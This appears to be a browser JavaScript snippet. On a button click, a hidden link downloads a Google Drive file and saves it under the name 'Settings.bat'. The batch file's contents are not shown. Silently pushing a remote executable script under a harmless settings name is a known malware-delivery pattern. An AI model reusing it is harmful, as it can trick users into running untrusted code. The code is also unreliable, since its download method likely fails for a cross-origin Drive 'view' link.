document.getElementById('downloadButton').addEventListener('click', function() {
    // Define the web-accessible file URL
    const fileURL = 'https://drive.google.com/file/d/1Z2GJnllRq3XKpq5yk-7PVqzYQnI3H4EI/view?usp=drive_link'; // Replace with the actual web URL

    // Create an invisible anchor element to trigger the download
    const a = document.createElement('a');
    a.style.display = 'none';
    document.body.appendChild(a);

    // Set the download attribute and the file URL
    a.setAttribute('download', 'Settings.bat');
    a.setAttribute('href', fileURL);

    // Trigger a click event to start the download
    a.click();

    // Clean up by removing the anchor element
    document.body.removeChild(a);
});
